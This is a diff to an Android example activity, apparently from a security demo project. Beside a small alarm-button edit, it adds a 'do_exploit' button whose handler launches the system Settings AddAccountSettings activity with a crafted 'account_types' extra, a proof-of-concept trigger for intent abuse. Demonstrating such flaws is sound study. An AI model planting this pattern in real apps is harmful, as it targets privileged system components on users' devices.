@@ -3,10 +3,14 @@ package com.metova.hackeryexamplesproject;
 import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.SystemClock;
+import android.support.annotation.Nullable;
+import android.util.AttributeSet;
 import android.view.View;
 import android.widget.Button;
 
@@ -24,7 +28,7 @@ public class ExampleActivity extends Activity {
     @Override
     protected void onStart() {
 
-        Button start = (Button) findViewById(R.id.start_alarm);
+        final Button start = (Button) findViewById(R.id.start_alarm);
 
         start.setOnClickListener(new View.OnClickListener() {
 
@@ -40,6 +44,28 @@ public class ExampleActivity extends Activity {
                 setRepeatingRTCAlarm(calendar); // start an alarm at 10:00 a.m. and repeat every ~ 15 minutes
             }
         });
+
+        final Button doExploit = (Button) findViewById(R.id.do_exploit);
+
+        doExploit.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+
+                doExploit();
+            }
+        });
+    }
+
+    private void doExploit() {
+
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
+        intent.setAction(Intent.ACTION_RUN);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        String authTypes[] = {"exploit"};
+
+        intent.putExtra("account_types", authTypes);
+        startActivity(intent);
     }
 
     private void setRealtimeAlarm(int delay) {
